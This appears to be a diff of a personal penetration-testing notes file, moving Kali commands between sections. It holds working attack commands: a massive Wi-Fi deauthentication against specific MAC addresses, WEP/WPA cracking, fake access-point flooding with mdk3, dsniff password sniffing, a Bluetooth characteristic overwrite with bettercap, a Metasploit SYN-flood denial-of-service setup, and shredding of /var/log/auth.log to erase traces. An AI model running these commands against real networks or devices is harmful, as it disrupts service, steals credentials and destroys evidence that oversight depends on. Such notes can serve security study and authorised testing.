@@ -249,20 +249,6 @@ iwgetid - reports curretn essid / ap
 
 hciconfig dev_name up 
 sdptool browse MAC_ADDRESS 
-btscanner # launches GUI interface 
-##
-bettercap 
-ble.recon on  ## returns the range and device name of enabled BT devices 
-ble.recon off 
-ble.show 
-ble.enum MAC_ADDRESS  # PROVIDES MORE INFO ON BLUETOOTH DEV 
-##ss
-192.168.0.0/24 > 192.168.0.37  » net.show
-192.168.0.0/24 > 192.168.0.37  » ble.recon on ### BLUETOOTH SNIFFING MODULE 
-192.168.0.0/24 > 192.168.0.37  » ble.show  ### IDENTIFY HOSTS TO PROBE 
-192.168.0.0/24 > 192.168.0.37  » ble.enum 56:73:e6:ea:ce:c5 ### SCAN AND INTERACT W/ DEVICES 
-192.168.0.0/24 > 192.168.0.37  » ble.write 7e:dc:48:7c:77:ea 69d1d8f345e149a898219bbdfdaad9d9 ffffffffffffffff ### writting fffff to the writeable field found 
-
 
 
 netstat - [helps display network activity;  (like TCP and UDP) are being used. and rouing. --- outputs mainly TCP] 
@@ -274,22 +260,44 @@ netstat -rn [finds gatweay address]
 
 sudo netdiscover -i eth0 -r 192.168.64.1/24,/16,/8 [ [DISCOVER WHOS ON NETWORK]
 dsniff - [practically snniffing for any password (FTP HTTP) WHILE ON NETWORK MDODE.] 
-
 netcat [nc] --> [is a creepy, it can be used to follow you oce or persisant follwig you with a fwe commands. it can watch you upload/download or do anything on the networkthat hpersists) 
 
 ------------------------------------------------------ WIFI-PESTER ------------------------------------------------------
 
+[DEAUTH]
 netdiscover -r 192.168.50.1/24
 aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
 
-### CRACKING WEP / WPA ####
+[CRACKING WEP / WPA]
 besside-ng en0 -c 6 -b
 airodump-ng wlx0013eff5483f --encrypt wep
 
+[make abunch of differnt APS] 
+sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
+airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
+
+[TCP FLOOD] 
+sudo nmap -p1-64580 192.168.50.111
+service postgresql start 
+msfconsole
+search synflood 
+use auxiliary/dos/tcp/synflood
+show options 
+set RHOST 192.168.50.111
 
 ------------------------------------------------------ BLUETOOTHNESS ------------------------------------------------------
 
  https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
+
+ btscanner # launches GUI interface 
+
+bettercap 
+ble.recon on  ## returns the range and device name of enabled BT devices 
+ble.recon off 
+ble.show 
+ble.enum MAC_ADDRESS  # PROVIDES MORE INFO ON BLUETOOTH DEV 
+
+
 hciconfig -h ## bluetooth context manager, similar to wifi manager (help menu)
 man hciconfig 
 man hcitool 
@@ -387,7 +395,7 @@ nmap 192.168.50.1 -oX /home/frank/nmapout.xml
 nmap cpanel.dedicatedglass.com/24 -oX /home/frank/nmap.xml
 sudo nmap -sP -n 192.168.0.0/24 ## nmap to return mac address
 sudo nmap -sV --scripts=vulscan xxxx 
-
+whois lookup
 (PORT SCAN WITH IplisT)
 sudo nmap -iL iplist.txt
 
@@ -498,6 +506,13 @@ sudo msfrpcd -U msf -P pass --ssl
 sudo msfrpcd -U msf -P pass -a 127.0.0.1 --ssl
 sudo armitage 
 
+------------------------------------------------------ [WEB-APP VULNS]  ------------------------------------------------------
+1. Burp Suite
+2. Nikto
+3. Maltego
+4. SQLMap ---> [Automates manual SQL Injectiionns]
+5. Whatweb
+6. whoislookup
 
 
 #### FOR BROWSER PLUGINS (OSNIT, SELF SECURITY)
@@ -537,19 +552,14 @@ sudo rm auth.log
 shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
 truncate -s 0 /var/log/auth.log 
 
-## make abunch of differnt APS 
- sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
-airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
 
-########## OPEN PORTS FOR SERVERS ##########
+------------------------------------------------------ [PORT-MAN]  ------------------------------------------------------
 
 UBUNTU - NGINX - FIREWALL
 sudo ufw status
 sudo ufw allow 80/udp
 sudo ufw allow 80/tcp
 sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-
-
 sudo ufw allow 9999/udp
 sudo ufw allow 9999/tcp
 sudo iptables -A INPUT -p tcp --dport 9999 -j ACCEPT
@@ -589,14 +599,7 @@ nano config.json
 python noisy.py --config config.json
 
 
-### TCP FLOOD ### 
-sudo nmap -p1-64580 192.168.50.111
-service postgresql start 
- msfconsole
-search synflood 
-use auxiliary/dos/tcp/synflood
-show options 
-set RHOST 192.168.50.111
+
 
 
 ####################################
